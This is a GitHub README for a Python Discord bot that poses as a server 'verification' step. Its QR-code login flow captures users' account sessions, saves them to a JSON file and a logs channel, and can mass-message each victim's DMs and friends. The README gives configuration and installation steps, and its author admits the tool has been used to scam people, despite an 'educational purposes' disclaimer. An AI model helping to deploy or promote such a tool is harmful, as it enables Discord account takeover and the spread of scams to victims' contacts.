<h1 align="center">[Discord] - Patched version of Fake Verification Bot</h1>

<p align="center">
  <a href="https://github.com/AstraaDev/Fake-Verification-Bot/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-important">
  </a>
  <a href="https://www.python.org">
    <img src="https://img.shields.io/badge/Python-3.9-informational.svg">
  </a>
  <a href="https://github.com/AstraaDev">
    <img src="https://img.shields.io/github/repo-size/AstraaDev/Fake-Verification-Bot.svg?label=Repo%20size&style=flat-square">
  </a>
</p>

<h3><p align="center">
  My work was never created to be used in a malicious way. I noticed that it was used to scam other people and I'm sorry about that.
  I'm thinking of deleting this directory to avoid further damage.
</p></h3>


## Disclaimer

|Bot was made for Educational purposes|
|-------------------------------------------------|
This project was created only for good purposes and personal use.
By using this Bot, you agree that you hold responsibility and accountability of any consequences caused by your actions.

## Features

- Async QR Code Management
- Using Websockets (no browser used)
- Personal QR Code (visible only to the person passing the verification)
- Saves the information in a json file
- Can gives a role to the user after his verification
- Can send a message to all the user's DMs + all user's Friend
- Possibility to define a logs channel
- Easy to use + Intuitive UI (like my [SelfBot](https://github.com/AstraaDev/Discord-SelfBot))

## How To Setup/Install

#### First of all please set your informations in the config.json file!
```json
{
    "botToken": "BOT-TOKEN-HERE", #For more information, read below
    "logs_channel_id": "LOGS-CHANNEL-ID-HERE", #ID of the channel to which the bot logs will be sent
    
    "prefix": "PREFIX-HERE",
    "command_name": "COMMAND-NAME-HERE",
    
    "give_role": false, #Can take the value: true or false
    "role_name": "ROLE-NAME-HERE", #Name of the role you want to give to the user after scanning the QR Code
    
    "mass_dm": 0, #Can take the value: 0 (Disable), 1 (current user's dms), 2 (user's friends), 3 (Current DMs + Friends)
    "message": "MESSAGE-HERE" #Message you want to send to all user's DMs after scanning the QR code
}
```
#### Set up and invite your Bot.
- Create a bot on the [Discord Developer page](https://discord.com/developers/applications)
- Enable all instances in the "Bot" tab
- Invite your bot using this [invite](https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=8&scope=applications.commands%20bot) (replace CLIENTID by the ID of your Bot)

#### 1st・Installation (Automated installation)
```
Launch the setup.bat file. A new file will be created. You will only have to launch it.
```

#### 2nd・Installation (Manual installation)
```
$ git clone https://github.com/AstraaDev/Fake-Verification-Bot.git
$ python -m pip install -r requirements.txt
$ python main.py
```

## Additional Informations
General Informations:
- If you find any malfunction, join my [Discord Server](https://discord.gg/PKR7nM9j9U).


## Example
<img src="https://cdn.discordapp.com/attachments/1033450243481677874/1064212639678464052/06CDB729-D554-4267-BC09-6E604636D14D.png?ex=66f23981&is=66f0e801&hm=983726d7dcaf5b9e5338f4f0dbcfb89b7e2c0e40017181847b06543cb4252fd2&" width="400">
<img src="https://cdn.discordapp.com/attachments/1033450243481677874/1064212639879798804/724386BC-E295-4A3F-85E5-2BADBD726BA0.png?ex=66f23981&is=66f0e801&hm=0f587877b68b774606a5bda111334342c67b7bbf024c295336827dd858eec892&" width="400">

## Credits
Many thanks to [RuslanUC](https://github.com/RuslanUC) for [RemoteAuthClient](https://github.com/RuslanUC/RemoteAuthClient).
